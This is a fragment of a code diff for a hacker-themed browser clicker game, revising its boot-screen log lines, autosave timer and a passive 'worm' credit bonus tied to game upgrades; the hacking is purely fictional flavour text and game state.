+    if(g)showOffModal(g);
+  }else{
+    updateUI(); updateTapBtn();
+    const lines=[
+      ['> HACKNODE OS v0.3.0','dim',180],['> Alias: ghost_r00t','ok',140],
+      ['> Location: UNKNOWN','dim',110],['> Status: UNTRACEABLE','ok',160],
+      ['─'.repeat(36),'sep',200],
+      ['> Two phases: TYPE the command, then hardware PROCESSES it.','info',80],
+      ['> Watch for INTERRUPTS during processing. React fast.','dim',60],
+      ['> Run NETWORK SCAN first — intel unlocks bonuses on follow-ups.','dim',0],
+    ];
+    for(const[t,c,w]of lines){log(t,c);if(w)await delay(w);}
   }
 }
-
-async function introSequence() {
-  const lines = [
-    ['> Booting HACKNODE OS...', 'log-dim', 200],
-    ['> Alias: ghost_r00t', 'log-ok', 150],
-    ['> Location: UNKNOWN', 'log-dim', 150],
-    ['> Status: UNTRACEABLE', 'log-ok', 200],
-    ['─'.repeat(38), 'log-sep', 300],
-    ['> Ready. Select a MISSION to begin.', 'log-info', 100],
-    ['> Tap [MISSIONS] to choose your target.', 'log-dim', 0],
-  ];
-  for (const [text, cls, wait] of lines) {
-    log(text, cls);
-    if (wait) await delay(wait);
-  }
-}
-
-function delay(ms) {
-  return new Promise(r => setTimeout(r, ms));
-}
-
-// ════════════════════════════════════════════════
-// INIT
-// ════════════════════════════════════════════════
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
 
 boot();
-
-// Auto-save every 30s
-setInterval(() => save(), 30000);
-
-// Passive credit drip if worm deployed
-setInterval(() => {
-  if ((G.upgrades['worm']||0) >= 1 || G.missionsCompleted >= 5) {
-    // Small passive trickle post-worm deploy
-    if (G.missionsCompleted >= 5) {
-      G.credits += 0.5 * G.rep;
-      updateUI();
-    }
+setInterval(()=>save(),30000);
+// Passive worm drip
+setInterval(()=>{
+  if(G.missionsCompleted>=50&&(G.upgrades.ssh_backdoor||G.upgrades.worm_deploy)){
+    G.credits+=1.5*G.rep; updateUI();
   }
-}, 2000);
-
+},3000);
 </script>
 
 </body>
